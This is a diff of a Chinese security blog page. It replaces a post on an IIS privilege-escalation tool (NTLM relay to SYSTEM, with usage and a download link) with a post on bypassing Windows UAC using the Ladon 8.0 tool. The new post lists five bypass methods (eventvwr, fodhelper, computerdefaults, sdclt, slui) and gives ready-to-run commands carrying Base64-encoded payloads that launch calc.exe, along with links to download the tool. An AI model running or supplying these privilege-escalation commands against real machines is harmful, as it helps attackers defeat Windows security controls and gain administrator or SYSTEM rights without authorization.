@@ -19,14 +19,11 @@
     <link rel="dns-prefetch" href="http://k8gege.org">
     <!--SEO-->
 
-<meta name="keywords" content="Exp,Tool,LPE,IIS">
+<meta name="keywords" content="Ladon,bypassUAC">
 
 
-<meta name="description" content="工具: iislpe.exe
-编译: .net 3.5 
-　　全版本IIS提权工具,支持IIS应用池用户/网络服务用户/本地服务用户
-原理:
-&nbsp;&nbsp;&nbsp;&nbsp;&n...">
+<meta name="description" content="什么是UAC根据MSDN中的文档,User Account Control(UAC)是在Windows Vista 以后版本中引入的一种安全机制,针对具有有限权限的账户.
+通过 UAC，应用程序...">
 
 
 <meta name="robots" content="all">
@@ -37,7 +34,7 @@
 
 <title>
     
-    全版本IIS提权工具iislpe |
+    〖提权〗Ladon 8.0五种方法BypaaUAC(Win7-Win10) |
     
     K8哥哥’s Blog
 </title>
@@ -157,16 +154,16 @@
                     <p id="process"></p>
 <article class="post">
     <div class="post-head">
-        <h1 id="全版本IIS提权工具iislpe">
+        <h1 id="〖提权〗Ladon 8.0五种方法BypaaUAC(Win7-Win10)">
             
-            全版本IIS提权工具iislpe
+            〖提权〗Ladon 8.0五种方法BypaaUAC(Win7-Win10)
             
         </h1>
         <div class="post-meta">
     
     <span class="categories-meta fa-wrap">
         <i class="fa fa-folder-open-o"></i>
-        <a class="category-link" href="/categories/Tool/">工具</a> <a class="category-link" href="/categories/Lpe/">提权</a>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
     </span>
     
     
@@ -174,7 +171,7 @@
         <i class="fa fa-tags"></i>
         <span class="tags-meta">
             
-            <a class="tag-link" href="/tags/Exp/" rel="tag">Exp</a> <a class="tag-link" href="/tags/IIS/" rel="tag">IIS</a> <a class="tag-link" href="/tags/LPE/" rel="tag">LPE</a> <a class="tag-link" href="/tags/Tool/" rel="tag">Tool</a>
+            <a class="tag-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-link" href="/tags/bypassUAC/" rel="tag">bypassUAC</a>
             
         </span>
     </span>
@@ -184,7 +181,7 @@
     <span class="fa-wrap">
         <i class="fa fa-clock-o"></i>
         <span class="date-meta">
-            2019/12/03</span>
+            2021/02/06</span>
     </span>
     
     <span class="fa-wrap">
@@ -196,28 +193,37 @@
 </div>
         
         
-        <p class="fa fa-exclamation-triangle warning">
-            本文于<strong>
-                431</strong>
-            天之前发表
-        </p>
-        
     </div>
     
     <div class="post-body post-content">
-        <p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>
+        <h3 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h3><p>根据MSDN中的文档,User Account Control(UAC)是在Windows Vista 以后版本中引入的一种安全机制,针对具有有限权限的账户.</p>
+<p>通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p>
+<h3 id="BypassUAC方法"><a href="#BypassUAC方法" class="headerlink" title="BypassUAC方法"></a>BypassUAC方法</h3><p>目前公开的绕过UAC的几种方式:</p>
+<p>1.各类的UAC白名单程序的DLL劫持<br>2.各类自动提升权限的COM接口利用(Elevated COM interface)<br>3.Windows 自身漏洞提权<br>4.远程注入</p>
+<p>UACME: <a href="https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法，有兴趣可自行研究" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法，有兴趣可自行研究</a></p>
+<h3 id="利用白名单"><a href="#利用白名单" class="headerlink" title="利用白名单"></a>利用白名单</h3><p>上文也已经分析了,如果进程本身具有管理员权限或者可以直接获取管理员权限的话,就不会弹出UAC框让用户确认,这类程序被称为白名单程序，例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe，rundll32.exe，explorer.exe等等。</p>
+<h3 id="Ladon-8-0"><a href="#Ladon-8-0" class="headerlink" title="Ladon 8.0"></a>Ladon 8.0</h3><p>[+] BypassUac 五种方法UAC提权（非交互式执行Base64加密CMD命令）<br>用法Ladon BypassUac</p>
+<p>eventvwr<br>fodhelper<br>computerdefaults<br>sdclt<br>slui</p>
+<p>[+] BypassUac2 eventvwr方法执行明文cmd命令（即8.0前的bypassUAC）</p>
+<h3 id="Ladon用法"><a href="#Ladon用法" class="headerlink" title="Ladon用法"></a>Ladon用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Load BypassUAC</span><br><span class="line">Usage:</span><br><span class="line">Method: eventvwr, fodhelper,computerdefaults, sdclt, slui</span><br><span class="line">Default Bypass Method is eventvwr</span><br><span class="line">Ladon BypassUAC Method Base64Cmd</span><br><span class="line">Example:</span><br><span class="line">Ladon BypassUAC eventvwr Y2FsYw==</span><br></pre></td></tr></table></figure>
+
+<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>Example usage for eventvwr bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for fodhelper bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for computerdefaults bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for sdclt bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+
+<p>Note: this appears to only work on Windows 10 in my testing</p>
+<p>Example usage for slui bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure>
+<p>Example usage for DiskCleanup bypass to launch calc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo3.4: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>Ladon 7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>Ladon 8.0版本：K8小密圈</p>
+
     </div>
     
     <div class="reward" ontouchstart>
@@ -245,17 +251,11 @@
 </article>
 <div class="article-nav prev-next-wrap clearfix">
     
-    <a href="/p/b8e58f69.html" class="pre-post btn btn-default" title="CVE-2018-2628 Weblogic GetShell Exploit">
-        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
-        <span class="hidden-xs">
-            CVE-2018-2628 Weblogic GetShell Exploit</span>
-    </a>
     
-    
-    <a href="/p/16b5ff0b.html" class="next-post btn btn-default" title="基于Browser协议探测内网主机">
+    <a href="/p/ladon_phpshell.html" class="next-post btn btn-default" title="〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码">
         <span class="hidden-lg">下一篇</span>
         <span class="hidden-xs">
-            基于Browser协议探测内网主机</span><i class="fa fa-angle-right fa-fw"></i>
+            〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码</span><i class="fa fa-angle-right fa-fw"></i>
     </a>
     
 </div>
@@ -291,7 +291,7 @@ gitalk.render('gitalk-container');
             Table of Contents
         </h3>
         
-        <p>not dir</p>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是UAC"><span class="toc-text">什么是UAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BypassUAC方法"><span class="toc-text">BypassUAC方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用白名单"><span class="toc-text">利用白名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-8-0"><span class="toc-text">Ladon 8.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon用法"><span class="toc-text">Ladon用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-text">Example</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon下载"><span class="toc-text">Ladon下载</span></a></li></ol>
         
     </div>
 </aside>
